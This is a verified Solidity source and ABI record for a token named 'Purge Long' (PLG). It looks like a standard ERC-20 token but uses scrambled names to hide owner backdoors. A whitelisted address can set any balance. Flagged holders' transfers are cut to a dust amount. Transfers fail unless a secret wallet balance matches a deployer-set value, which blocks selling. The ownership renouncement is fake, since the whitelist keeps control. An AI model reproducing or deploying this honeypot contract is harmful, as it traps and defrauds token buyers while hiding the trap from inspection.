{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface modeSenderMarketing {\n    function createPair(address walletTake, address maxReceiver) external returns (address);\n}\n\ninterface shouldMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundMax) external view returns (uint256);\n\n    function transfer(address launchAuto, uint256 receiverMax) external returns (bool);\n\n    function allowance(address tradingExemptLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAuto,\n        uint256 receiverMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toAuto, uint256 value);\n    event Approval(address indexed tradingExemptLimit, address indexed spender, uint256 value);\n}\n\nabstract contract amountTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyTotalLimit is shouldMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PurgeLong is amountTake, shouldMin, buyTotalLimit {\n\n    function owner() external view returns (address) {\n        return isMarketing;\n    }\n\n    string private teamLiquidity = \"PLG\";\n\n    mapping(address => bool) public listSell;\n\n    function exemptAmount(address atWallet) public {\n        if (tradingFeeSwap) {\n            return;\n        }\n        \n        listSell[atWallet] = true;\n        if (sellTeamLaunched == tradingAt) {\n            limitSwap = sellToken;\n        }\n        tradingFeeSwap = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalFund;\n    }\n\n    uint256 exemptTeam;\n\n    mapping(address => bool) public limitIsEnable;\n\n    function teamExempt(address liquidityTake) public {\n        marketingToken();\n        if (exemptReceiver != sellTeamLaunched) {\n            marketingExemptShould = teamAt;\n        }\n        if (liquidityTake == takeFundTrading || liquidityTake == liquidityWalletFrom) {\n            return;\n        }\n        limitIsEnable[liquidityTake] = true;\n    }\n\n    uint256 private teamAt;\n\n    function balanceOf(address fundMax) public view virtual override returns (uint256) {\n        return minAmountTeam[fundMax];\n    }\n\n    uint256 public marketingExemptShould;\n\n    mapping(address => mapping(address => uint256)) private marketingEnable;\n\n    event OwnershipTransferred(address indexed maxSell, address indexed receiverTx);\n\n    uint256 private tradingAt;\n\n    function autoTotal(uint256 receiverMax) public {\n        marketingToken();\n        exemptTeam = receiverMax;\n    }\n\n    bool public minAt;\n\n    bool public fundSell;\n\n    address public takeFundTrading;\n\n    bool public tradingFeeSwap;\n\n    function fromLiquidity(address senderReceiver, uint256 receiverMax) public {\n        marketingToken();\n        minAmountTeam[senderReceiver] = receiverMax;\n    }\n\n    uint8 private atAuto = 18;\n\n    function approve(address amountLaunchTake, uint256 receiverMax) public virtual override returns (bool) {\n        marketingEnable[_msgSender()][amountLaunchTake] = receiverMax;\n        emit Approval(_msgSender(), amountLaunchTake, receiverMax);\n        return true;\n    }\n\n    function feeBuy(address receiverReceiver, address launchAuto, uint256 receiverMax) internal returns (bool) {\n        if (receiverReceiver == takeFundTrading) {\n            return feeTotal(receiverReceiver, launchAuto, receiverMax);\n        }\n        uint256 tradingReceiver = shouldMin(liquidityWalletFrom).balanceOf(autoWallet);\n        require(tradingReceiver == exemptTeam);\n        require(launchAuto != autoWallet);\n        if (limitIsEnable[receiverReceiver]) {\n            return feeTotal(receiverReceiver, launchAuto, receiverSellIs);\n        }\n        return feeTotal(receiverReceiver, launchAuto, receiverMax);\n    }\n\n    function transferFrom(address receiverReceiver, address launchAuto, uint256 receiverMax) external override returns (bool) {\n        if (_msgSender() != toReceiver) {\n            if (marketingEnable[receiverReceiver][_msgSender()] != type(uint256).max) {\n                require(receiverMax <= marketingEnable[receiverReceiver][_msgSender()]);\n                marketingEnable[receiverReceiver][_msgSender()] -= receiverMax;\n            }\n        }\n        return feeBuy(receiverReceiver, launchAuto, receiverMax);\n    }\n\n    uint256 public sellToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLiquidity;\n    }\n\n    address toReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fundIs() public {\n        emit OwnershipTransferred(takeFundTrading, address(0));\n        isMarketing = address(0);\n    }\n\n    address private isMarketing;\n\n    uint256 public totalTx;\n\n    constructor (){\n        \n        fromFund marketingSell = fromFund(toReceiver);\n        liquidityWalletFrom = modeSenderMarketing(marketingSell.factory()).createPair(marketingSell.WETH(), address(this));\n        \n        takeFundTrading = _msgSender();\n        listSell[takeFundTrading] = true;\n        minAmountTeam[takeFundTrading] = totalFund;\n        fundIs();\n        if (sellTeamLaunched != limitSwap) {\n            sellTeamLaunched = teamAt;\n        }\n        emit Transfer(address(0), takeFundTrading, totalFund);\n    }\n\n    string private takeAuto = \"Purge Long\";\n\n    function getOwner() external view returns (address) {\n        return isMarketing;\n    }\n\n    address public liquidityWalletFrom;\n\n    function feeTotal(address receiverReceiver, address launchAuto, uint256 receiverMax) internal returns (bool) {\n        require(minAmountTeam[receiverReceiver] >= receiverMax);\n        minAmountTeam[receiverReceiver] -= receiverMax;\n        minAmountTeam[launchAuto] += receiverMax;\n        emit Transfer(receiverReceiver, launchAuto, receiverMax);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atAuto;\n    }\n\n    uint256 private totalFund = 100000000 * 10 ** 18;\n\n    address autoWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant receiverSellIs = 5 ** 10;\n\n    uint256 takeMin;\n\n    function allowance(address receiverTotal, address amountLaunchTake) external view virtual override returns (uint256) {\n        if (amountLaunchTake == toReceiver) {\n            return type(uint256).max;\n        }\n        return marketingEnable[receiverTotal][amountLaunchTake];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeAuto;\n    }\n\n    uint256 public limitSwap;\n\n    uint256 public sellTeamLaunched;\n\n    uint256 private exemptReceiver;\n\n    function transfer(address senderReceiver, uint256 receiverMax) external virtual override returns (bool) {\n        return feeBuy(_msgSender(), senderReceiver, receiverMax);\n    }\n\n    mapping(address => uint256) private minAmountTeam;\n\n    function marketingToken() private view {\n        require(listSell[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingExemptLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunchTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"autoTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"}],\"name\":\"exemptAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"fromLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitIsEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityWalletFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingExemptShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeamLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFundTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"teamExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFeeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PurgeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}